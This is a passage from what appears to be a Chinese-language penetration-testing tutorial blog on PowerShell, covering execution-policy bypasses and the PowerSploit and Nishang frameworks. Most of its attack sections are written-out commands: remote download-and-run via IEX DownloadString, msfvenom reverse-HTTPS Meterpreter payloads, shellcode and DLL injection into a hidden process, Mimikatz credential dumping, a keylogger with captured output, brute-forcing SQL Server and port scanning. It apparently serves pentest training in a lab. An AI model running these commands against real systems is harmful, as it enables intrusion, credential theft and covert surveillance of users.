class="keyword">Do</span> &#123;&#125; <span class="keyword">While</span><span class="comment">()</span></span><br><span class="line">For<span class="comment">(;;;)</span> &#123;&#125;</span><br></pre></td></tr></table></figure><h5 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">使用powershell满足一个标椎动词-名词组合，来帮助我们更快理解。</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Get</span>-<span class="keyword">Alias</span> -<span class="type">name</span> dir 查看别名</span><br><span class="line"></span><br><span class="line">    Ls env 查看当前环境变量</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Get</span>-ExecutionPolicy 查看当前执行策略</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Set</span>-ExecutionPolicy 设置执行的策略</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Get</span>-Host 查看powershell版本</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Get</span>-Content 查看文件内容</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Get</span>-Content test.txt  显示文本内容</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Set</span>-Content test.txt-<span class="keyword">Value</span> "hello,word" 设置文本内容</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Get</span>-Process  查看当前服务列表</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Get</span>-<span class="keyword">Location</span> 获取当前位置</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Get</span>-WmiObject -<span class="keyword">Class</span> Win32_ComputerSystem |<span class="keyword">Select</span>-<span class="keyword">object</span> -ExpandProperty UserName 查看登录到物理机的用户</span><br></pre></td></tr></table></figure><h4 id="cmdlets说明"><a href="#cmdlets说明" class="headerlink" title="cmdlets说明"></a>cmdlets说明</h4><p><strong>Cmdlets</strong>是PowerShell的非常重要的内部命令集。</p><p><strong>Cmdlet</strong>是以.NET类实例形式存在的命令。</p><p>它并不是简单的可执行文件，它有很多属性，这些属性用来指定输入参数或者使用管道来管理重定向。</p><p>Cmdlets可以用任何.NET语言来编写，也可以用PowerShell脚本语言来编写。我们可以通过输入“Get-Command”可以显示可用的Cmdlets命令。</p><p>输入“Get-Command”，这将返回所有可用的命令</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200720143951.png" alt=""></p><h5 id="渗透中常用的cmdlets命令"><a href="#渗透中常用的cmdlets命令" class="headerlink" title="渗透中常用的cmdlets命令"></a>渗透中常用的cmdlets命令</h5><p>查看start-process的帮助文档，</p><p><code>Get-Help Start-Process</code>，</p><p>如图：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200720144622.png" alt=""></p><p>我们也可以使用Get-Process命令来获取指定的进程。这个命令在后渗透中也很有用而且经常用到，可以用来获取进程的ID，比如获取资源管理器的ID，如图：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200720144954.png" alt=""></p><p><strong>常用的cmdlets的命令</strong></p><ul><li>Copy a file: Copy-Item source_file destination_file</li><li>Move a file: Move-Item source_file destination_file</li><li>Get Services: Get-Service</li><li>Formatting output: Get-Process l Format-List –property name</li><li>Get hash (SHA1) of a file: Get-FileHash –Algorithm SHA1 file</li><li>Get-Content</li><li>Get-Location</li><li>start-process </li></ul><h4 id="powershell执行策略"><a href="#powershell执行策略" class="headerlink" title="powershell执行策略"></a>powershell执行策略</h4><table><thead><tr><th>名称</th><th>说明</th></tr></thead><tbody><tr><td>Restricted</td><td>受限制的，可以执行单个的命令，但是不能执行脚本Windows 8, Windows Server 2012, and Windows 8.1中默认就是这种策略，所以是不能执行脚本的，执行就会报错，那么如何才能执行呢？Set-ExecutionPolicy -ExecutionPolicy Bypass就是设置策略为Bypass这样就可以执行脚本了。</td></tr><tr><td>AllSigned</td><td>AllSigned 执行策略允许执行所有具有数字签名的脚本</td></tr><tr><td>RemoteSigned</td><td>当执行从网络上下载的脚本时，需要脚本具有数字签名，否则不会运行这个脚本。如果是在本地创建的脚本则可以直接执行，不要求脚本具有数字签名。</td></tr><tr><td>Unrestricted</td><td>这是一种比较宽容的策略，允许运行未签名的脚本。对于从网络上下载的脚本，在运行前会进行安全性提示。需要你确认是否执行脚本</td></tr><tr><td>Bypass</td><td>Bypass 执行策略对脚本的执行不设任何的限制，任何脚本都可以执行，并且不会有安全性提示。</td></tr><tr><td>Undefined</td><td>Undefined 表示没有设置脚本策略。当然此时会发生继承或应用默认的脚本策略。</td></tr></tbody></table><h5 id="绕过策略的常见方法"><a href="#绕过策略的常见方法" class="headerlink" title="绕过策略的常见方法"></a>绕过策略的常见方法</h5><ul><li>本地读取然后通过管道符运行</li></ul><p><code>powershell get-content test.ps1 | powershell -noprofile -</code></p><ul><li>远程下载并通过IEX运行脚本</li></ul><p><code>powershell -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://xxx.xxx.xxx/a.ps1&#39;)&quot;</code></p><ul><li>Bypass执行策略绕过</li></ul><p><code>powershell -executionpolicy bypass -File ./a.ps1</code></p><ul><li>Unrestricted执行策略标志</li></ul><p><code>powershell -executionpolicy unrestricted -File ./a.ps1</code></p><p>当运行一个从网上下载的未签名的脚本时，会给出权限提示</p><p><strong>注:</strong></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression（IEX的别名）：用来把字符串当作命令执行。</span><br><span class="line"></span><br><span class="line">WindowStyle Hidden（-w Hidden）：隐藏窗口</span><br><span class="line"></span><br><span class="line">Nonlnteractive（-NonI）：非交互模式，PowerShell不为用户提供交互的提示。</span><br><span class="line"></span><br><span class="line"><span class="keyword">NoProfile（-NoP）：PowerShell控制台不加载当前用户的配置文件。</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">Noexit（-Noe）：执行后不退出Shell。</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">EncodedCommand（-enc）: </span>接受<span class="keyword">base64 </span>encode的字符串编码，避免一些解析问题</span><br></pre></td></tr></table></figure><h3 id="powershell渗透测试框架Powersploit"><a href="#powershell渗透测试框架Powersploit" class="headerlink" title="powershell渗透测试框架Powersploit"></a>powershell渗透测试框架Powersploit</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>PowerShell是一款基于PowerShell的后渗透(Post-Exploitation)框架软件</p><p>其github地址为 <a href="https://github.com/mattifestation/PowerSploit.git" target="_blank" rel="noopener">https://github.com/mattifestation/PowerSploit.git</a></p><h4 id="各模块功能"><a href="#各模块功能" class="headerlink" title="各模块功能"></a>各模块功能</h4><h5 id="一、代码执行（CodeExecution）"><a href="#一、代码执行（CodeExecution）" class="headerlink" title="一、代码执行（CodeExecution）"></a>一、代码执行（CodeExecution）</h5><ul><li>Invoke-DllInjection </li><li>Invoke-ReflectivePElnjection</li><li>Invoke-Shellcode</li><li>Invoke-WmiCommand</li></ul><h5 id="二、脚本修改（ScriptModification）"><a href="#二、脚本修改（ScriptModification）" class="headerlink" title="二、脚本修改（ScriptModification）"></a>二、脚本修改（ScriptModification）</h5><ul><li>Out-EncodedCommand</li><li>Out-CompressedDll</li><li>Out-EncryptedScript</li><li>Remove-Comments</li></ul><h5 id="三、权限维持（Persistence）"><a href="#三、权限维持（Persistence）" class="headerlink" title="三、权限维持（Persistence）"></a>三、权限维持（Persistence）</h5><ul><li>New-UserPersistenceOption</li><li>New-ElevatedPersistenceOption</li><li>Add-Persistence</li><li>Install-SSP</li><li>Get-SecurityPackages</li></ul><h5 id="四、绕过杀毒软件（AntivirusBypass）"><a href="#四、绕过杀毒软件（AntivirusBypass）" class="headerlink" title="四、绕过杀毒软件（AntivirusBypass）"></a>四、绕过杀毒软件（AntivirusBypass）</h5><p>Find-AVSignature</p><h5 id="五、信息收集（Exfiltration）"><a href="#五、信息收集（Exfiltration）" class="headerlink" title="五、信息收集（Exfiltration）"></a>五、信息收集（Exfiltration）</h5><p>这个文件夹主要是收集目标主机上的信息。</p><h5 id="六、信息侦察（Recon）"><a href="#六、信息侦察（Recon）" class="headerlink" title="六、信息侦察（Recon）"></a>六、信息侦察（Recon）</h5><p>这个文件夹主要是以目标主机为跳板进行内网主机侦察。</p><h4 id="搭建PowerSploit脚本服务器"><a href="#搭建PowerSploit脚本服务器" class="headerlink" title="搭建PowerSploit脚本服务器"></a>搭建PowerSploit脚本服务器</h4><p>1.下载PowerSploit到服务器</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span>  <span class="title">https</span>://github.com/mattifestation/PowerSploit.git</span><br></pre></td></tr></table></figure><p>2.启动Apache</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 <span class="literal">start</span></span><br></pre></td></tr></table></figure><p>3.本地查看是否成功搭建</p><h4 id="Invoke-Shellcode"><a href="#Invoke-Shellcode" class="headerlink" title="Invoke-Shellcode"></a>Invoke-Shellcode</h4><p>​    CodeExecution模块下的Invoke-Shellcode脚本常用于将Shellcode插入指定的进程ID或本地PowerShell中，下面介绍两种常用的反弹Meterpreter Shell方法。</p><h5 id="1-直接执行shellcode反弹Meterpreter-Shell"><a href="#1-直接执行shellcode反弹Meterpreter-Shell" class="headerlink" title="1.直接执行shellcode反弹Meterpreter Shell"></a>1.直接执行shellcode反弹Meterpreter Shell</h5><p>在MSF里使用reverse_https模块进行监听</p><p>使用msfvenom命令生成一个powershell脚本木马</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_https LHOST=<span class="number">192.168</span><span class="number">.157</span><span class="number">.139</span> LPORT=<span class="number">4444</span> -f powershell -o test</span><br></pre></td></tr></table></figure><p>接着在目标机Powershell下输入以下命令下载该脚本</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\<span class="keyword">zn</span>&gt; IEX (<span class="keyword">New</span>-Object Net.WebClient).DownloadString(<span class="string">"http://192.168.157.139/PowerSploit/CodeExecution/Invoke-Shellcode.ps1"</span>)</span><br></pre></td></tr></table></figure><p>接着输入以下命令下载木马</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">IEX</span> (New-Object Net.WebClient)<span class="selector-class">.DownloadString</span>(<span class="string">"http://192.168.139/test"</span>)</span><br></pre></td></tr></table></figure><p>接着在powershell下运行如下命令</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\zn&gt; Invoke-<span class="keyword">Shellcode </span>-<span class="keyword">Shellcode </span>($<span class="keyword">buf) </span>-Force</span><br></pre></td></tr></table></figure><p>其中的-Force意思是不用提示，直接执行。</p><p>​    按理说，此步骤执行完成后，返回MSF的监听界面下，会发现已经反弹成功了，可是我的Powershell在运行完Invoke-Shellcode -Shellcode ($buf) -Force命令后直接提示“Windows PowerShell已停止工作”，然后就崩溃了，导致不能反弹成功，不知道为啥。</p><h5 id="2-指定进程注入shellcode反弹Meterpreter-Shell"><a href="#2-指定进程注入shellcode反弹Meterpreter-Shell" class="headerlink" title="2.指定进程注入shellcode反弹Meterpreter Shell"></a>2.指定进程注入shellcode反弹Meterpreter Shell</h5><p>同样先在目标机Powershell下输入命令下载脚本和木马</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\<span class="keyword">zn</span>&gt; IEX (<span class="keyword">New</span>-Object Net.WebClient).DownloadString(<span class="string">"http://192.168.157.139/PowerSploit/CodeExecution/Invoke-Shellcode.ps1"</span>)</span><br><span class="line">PS C:\Users\<span class="keyword">zn</span>&gt; IEX (<span class="keyword">New</span>-Object Net.WebClient).DownloadString(<span class="string">"http://192.168.157.139/test"</span>)</span><br></pre></td></tr></table></figure><p>接着输入Get-Process命令或者ps命令查看当前进程</p><p>然后输入以下命令创建一个新的进程，并把它设置为隐藏的，再输入Get-Process命令查看进程，可以看到多了一个id为2668，名为notepad的进程</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">PS </span>C:\<span class="string">Users\</span><span class="string">zn&gt;</span> <span class="string">start-process </span>C:\<span class="string">Windows\</span><span class="string">System32\</span><span class="string">notepad.</span><span class="string">exe </span>-<span class="string">WindowStyle </span><span class="string">Hidden</span></span><br><span class="line"><span class="string">PS </span>C:\<span class="string">Users\</span><span class="string">zn&gt;</span> <span class="built_in">get-process</span> <span class="string">notepad</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Handles </span> <span class="string">NPM(</span>K)    <span class="string">PM(</span>K)      <span class="string">WS(</span>K) <span class="string">VM(</span>M)   <span class="string">CPU(</span>s)     <span class="string">Id </span><span class="string">ProcessName</span></span><br><span class="line"><span class="string">-</span>------  ------    -----      ----- -----   ------     -- -----------</span><br><span class="line">     <span class="string">56 </span>      7     <span class="string">1424 </span>      <span class="string">5384 </span>   <span class="string">75 </span>    0.<span class="string">02 </span>  <span class="string">2668 </span><span class="string">notepad</span></span><br></pre></td></tr></table></figure><p>接着输入以下命令，使用Invoke-Shellcode脚本进行进程注入</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\zn&gt; Invoke-<span class="keyword">Shellcode </span>-ProcessID <span class="number">2668</span> -<span class="keyword">Shellcode </span>($<span class="keyword">buf) </span>-Force</span><br><span class="line">记事本已停止工作</span><br></pre></td></tr></table></figure><p>同样的，按理说，此步骤执行完成后，返回MSF的监听界面下，会发现已经反弹成功了，可是我的Powershell在运行完Invoke-Shellcode -Shellcode ($buf) -Force命令后直接提示“Windows PowerShell已停止工作”，然后就崩溃了，导致不能反弹成功。</p><h4 id="Invoke-DllInjection"><a href="#Invoke-DllInjection" class="headerlink" title="Invoke-DllInjection"></a>Invoke-DllInjection</h4><p>下面使用CodeExecution模块下的另一个脚本Invoke-DllInjection，它是一个DLL注入的脚本。</p><p>同理还是首先在MSF里配置好监听，与上面的相同。</p><p>然后使用以下命令在kali中生成一个dll的反弹木马</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# msfvenom -p windows/meterpreter/reverse_https LHOST=<span class="number">192.168</span><span class="number">.157</span><span class="number">.139</span> LPORT=<span class="number">4444</span> -f dll -o /var/www/html/test.dll</span><br></pre></td></tr></table></figure><p>将test.dll下载到目标机</p><p>然后在目标机上下载脚本，输入以下命令</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\<span class="keyword">zn</span>&gt; IEX (<span class="keyword">New</span>-Object Net.WebClient).DownloadString(<span class="string">"http://192.168.157.139/PowerSploit/CodeExecution/Invoke-DllInjection.ps1"</span>)</span><br></pre></td></tr></table></figure><p>接着启动一个新进程，使用Invoke-Shellcode脚本进行进程注入</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PS C:<span class="symbol">\U</span>sers<span class="symbol">\z</span>n&gt; start-process C:<span class="symbol">\W</span>indows<span class="symbol">\S</span>ystem32<span class="symbol">\n</span>otepad.exe -WindowStyle Hidden</span><br><span class="line">PS C:<span class="symbol">\U</span>sers<span class="symbol">\z</span>n&gt; get-process notepad</span><br><span class="line"></span><br><span class="line">Handles  NPM(K)    PM(K)      WS(K) VM(M)   CPU(s)     Id ProcessName</span><br><span class="line">-------  ------    -----      ----- -----   ------     -- -----------</span><br><span class="line">     56       7     1424       5300    75     0.00   2008 notepad</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:<span class="symbol">\U</span>sers<span class="symbol">\z</span>n&gt; Invoke-DllInjection -ProcessID 2008 -Dll C:<span class="symbol">\U</span>sers<span class="symbol">\z</span>n<span class="symbol">\t</span>est.dll #先将文件下载到此处</span><br><span class="line">You cannot inject a 32-bit DLL into a 64-bit process.</span><br></pre></td></tr></table></figure><h4 id="Invoke-Portscan"><a href="#Invoke-Portscan" class="headerlink" title="Invoke-Portscan"></a>Invoke-Portscan</h4><p>nvoke-Portscan是Recon模块下的一个脚本，主要用于端口扫描，使用起来也比较简单。使用方法如下</p><p>先下载脚本，然后进行扫描</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="string">C:</span>\&gt; IEX (New-Object Net.WebClient).DownloadString(<span class="string">"http://192.168.157.139/PowerSploit/Recon/Invoke-Portscan.ps1"</span>)</span><br><span class="line"></span><br><span class="line">PS <span class="string">C:</span>\&gt; Invoke-Portscan -Hosts <span class="number">192.168</span><span class="number">.157</span><span class="number">.138</span> -Ports <span class="string">"80,22,3389"</span></span><br></pre></td></tr></table></figure><h4 id="Invoke-Mimikatz"><a href="#Invoke-Mimikatz" class="headerlink" title="Invoke-Mimikatz"></a>Invoke-Mimikatz</h4><p>Invoke-Mimikatz是Exfiltration模块下的一个脚本。使用方法如下</p><p>先下载脚本，然后执行命令即可</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="string">C:</span>\&gt; IEX (New-Object Net.WebClient).DownloadString(<span class="string">"http://192.168.157.139/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1"</span>)</span><br><span class="line">PS <span class="string">C:</span>\&gt; Invoke-Mimikatz -DumpCreds</span><br></pre></td></tr></table></figure><p>这里需要注意一点，和使用Mimikatz工具一样，内置的Mimikatz在使用时同样需要管理员权限。</p><h4 id="Get-Keystrokes"><a href="#Get-Keystrokes" class="headerlink" title="Get-Keystrokes"></a>Get-Keystrokes</h4><p>Get-Keystrokes是Exfiltration模块下的一个脚本，用于键盘记录，功能相当强大，不仅有键盘输入记录，甚至能记录鼠标的点击情况，还能记录详细的时间，实战时可以直接放入后台运行。使用方法如下。</p><p>先下载脚本，然后使用命令开启键盘记录，这里输入几个字母测试一下。</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">PS C:<span class="string">\&gt;</span> IEX (New-Object Net.WebClient).DownloadString(<span class="string">"http://192.168.157.139/PowerSploit/Exfiltration/Get-Keystrokes.ps1</span></span><br><span class="line"><span class="string">"</span>)</span><br><span class="line"></span><br><span class="line">PS C:<span class="string">\&gt;</span> Get-Keystrokes -LogPath C:<span class="string">\Users\zn\test1.txt</span></span><br><span class="line">PS C:<span class="string">\&gt;</span> sdfsadadads</span><br><span class="line"> </span><br><span class="line">打开test1.txt查看：</span><br><span class="line"><span class="string">"TypedKey"</span>,<span class="string">"WindowTitle"</span>,<span class="string">"Time"</span></span><br><span class="line"><span class="string">"s"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:13"</span></span><br><span class="line"><span class="string">"d"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:13"</span></span><br><span class="line"><span class="string">"f"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:13"</span></span><br><span class="line"><span class="string">"s"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:13"</span></span><br><span class="line"><span class="string">"a"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:13"</span></span><br><span class="line"><span class="string">"d"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:13"</span></span><br><span class="line"><span class="string">"a"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:14"</span></span><br><span class="line"><span class="string">"d"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:14"</span></span><br><span class="line"><span class="string">"a"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:14"</span></span><br><span class="line"><span class="string">"d"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:14"</span></span><br><span class="line"><span class="string">"s"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:14"</span></span><br><span class="line"><span class="string">"d"</span>,<span class="string">"C:\Users\zn\test1.txt - Notepad++"</span>,<span class="string">"2020/1/16 18:57:45"</span></span><br><span class="line"><span class="string">"a"</span>,<span class="string">"*C:\Users\zn\test1.txt - Notepad++"</span>,<span class="string">"2020/1/16 18:57:45"</span></span><br><span class="line"><span class="string">"s"</span>,<span class="string">"*C:\Users\zn\test1.txt - Notepad++"</span>,<span class="string">"2020/1/16 18:57:45"</span></span><br></pre></td></tr></table></figure><h4 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h4><p>主要来介绍PowerUp模块，powerUp拥有众多用来寻找目标主机的Windows服务漏洞进行提权的实用脚本，先下载脚本：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">IEX</span> (New-Object Net.WebClient)<span class="selector-class">.DownloadString</span>(<span class="string">"http://192.168.157.139/PowerSploit/Privesc/PowerUp.ps1"</span>)</span><br></pre></td></tr></table></figure><p><img src="1344396-20181223213723305-325093325.png" alt="img"></p><p>1.<strong>Invoke-AllChecks</strong></p><p>该模块会自动执行PowerUp下所有模块来检查目的主机：</p><p><img src="1344396-20181223213939733-173322209.png" alt="img"></p><p>2.<strong>Find-PathDLLHijack</strong></p><p>该模块用于检查当前%PATH%的哪些目录是用户可以写入的：</p><p><img src="1344396-20181223214157646-1940987848.png" alt="img"></p><p>3.<strong>Get-ServiceDetail</strong></p><p>该模块用于返回某服务的信息：</p><p><img src="1344396-20181223214527227-1884968775.png" alt="img"></p><h3 id="Powershell渗透框架nishang"><a href="#Powershell渗透框架nishang" class="headerlink" title="Powershell渗透框架nishang"></a>Powershell渗透框架nishang</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>​        Nishang是一个PowerShell脚本和有效载荷的框架和集合，它使PowerShell能够用于攻击安全性、渗透测试和红队。它是基于PowerShell的渗透测试专用工具，集成了框架、脚本和各种Payload，包括下载和执行、键盘记录、DNS、延时命令等脚本，被广泛用于渗透测试的各个阶段。Nishang在PowerShell3.0及以上的环境中才能正常使用，所以Windows7、Server2008下默认是有点小问题的。</p><p>项目地址：<a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang</a></p><p><img src="20191208151623232.png" alt=""></p><h5 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h5><ul><li>ActiveDirectory：活动目录</li><li>Antak-WebShell：WebShell</li><li>Backdoors：后门</li><li>Bypass：绕过</li><li>Client：客户端</li><li>Escalation：提权</li><li>Execution：执行</li><li>Gather：信息收集</li><li>MITM：</li><li>Misc：发音</li><li>Pivot：跳板、远程执行exe</li><li>Prasadhak：Virustotal </li><li>Scan：扫描</li><li>Shells：shell</li><li>Utility：杂项</li><li>Powerpreter：Meterpreter会话</li></ul><h4 id="Nishang使用姿势"><a href="#Nishang使用姿势" class="headerlink" title="Nishang使用姿势"></a>Nishang使用姿势</h4><p>导入所有的脚本到当前的PowerShell会话中(PowerShell v3之前)</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Import</span>-<span class="keyword">Module</span> -verbose  .\nishang.psm1</span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20200720162040.png" alt=""></p><p>然后输入命令：<code>Get-Command -Module nishang</code></p><p>查看nishang有哪些功能</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200720162317.png" alt=""></p><h4 id="nishang常用脚本"><a href="#nishang常用脚本" class="headerlink" title="nishang常用脚本"></a>nishang常用脚本</h4><p>​    Nishang基本上包含了渗透测试各个阶段的脚本，在扫描阶段，它也有两个很实用的脚本暴力破解和端口扫描。</p><h5 id="1-暴力破解-（Invoke-BruteForce"><a href="#1-暴力破解-（Invoke-BruteForce" class="headerlink" title="1.暴力破解 （Invoke-BruteForce)"></a>1.暴力破解 （Invoke-BruteForce)</h5><p>Invoke-BruteForce是Nishang中一个专注于暴力破解的脚本，它可以破解SQL Server、ActiveDirecotry、FTP、Web等服务。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Invoke-BruteForce</span> <span class="selector-tag">-ComputerName</span> <span class="selector-tag">SQLServ01</span> <span class="selector-tag">-UserList</span> <span class="selector-tag">C</span><span class="selector-pseudo">:testusername.txt</span> <span class="selector-tag">-PasswordList</span> <span class="selector-tag">C</span><span class="selector-pseudo">:testpassword.txt</span> <span class="selector-tag">-Service</span> <span class="selector-tag">SQL</span> <span class="selector-tag">-Verbose</span></span><br></pre></td></tr></table></figure><h5 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h5><p>Invoke-PortScan是Nishang中一个端口扫描脚本，它可以发现主机、解析主机名、端口扫描，是实战中一个很实用的脚本。</p><p>参数介绍：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-StartAddress &lt;<span class="keyword">String</span>&gt;起始IP-EndAddress &lt;<span class="keyword">String</span>&gt;终止IP-ResolveHost 加上这个参数，解析主机名。-ScanPort 加上这个参数，扫描端口-Ports 指定扫描的端口</span><br></pre></td></tr></table></figure><p>发现存活主机，解析主机名、扫描80端口是否开放。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke -StartAddress <span class="number">192.168</span><span class="number">.110</span><span class="number">.1</span> -EndAddress <span class="number">192.168</span><span class="number">.110</span><span class="number">.130</span> -ResolveHost -ScanPort -Ports <span class="number">80</span></span><br></pre></td></tr></table></figure><h5 id="3-下载文件"><a href="#3-下载文件" class="headerlink" title="3.下载文件"></a>3.下载文件</h5><p>​    Download_Execute是Nishang中一个下载执行脚本，它在实战中最常用的功能就是下载一个文本文件，然后将其转换为可执行文件执行。</p><p>用实例：</p><p>第一步：首先我们需要使用Nishang中的exetotext.ps1脚本将可执行文件更改为文本文件。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">C</span><span class="selector-pseudo">:Usersroot</span>&gt; <span class="selector-tag">ExetoText</span> <span class="selector-tag">c</span>:\<span class="selector-tag">powershellmsf</span><span class="selector-class">.exe</span> <span class="selector-tag">c</span>:\<span class="selector-tag">powershellmsf</span><span class="selector-class">.txt</span> <span class="selector-tag">Converted</span> <span class="selector-tag">file</span> <span class="selector-tag">written</span> <span class="selector-tag">to</span> <span class="selector-tag">c</span>:\<span class="selector-tag">powershellmsf</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure><p>第二步：使用Download_Execute下载执行文本文件</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="string">C:</span>Usersroot&gt; Download_Execute <span class="string">http:</span><span class="comment">//192.168.110.128/msf.txt</span></span><br></pre></td></tr></table></figure><p>使用实例：</p><p>第一步：首先我们需要使用Nishang中的exetotext.ps1脚本将可执行文件更改为文本文件。</p><h5 id="4-信息收集"><a href="#4-信息收集" class="headerlink" title="4.信息收集"></a>4.信息收集</h5><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 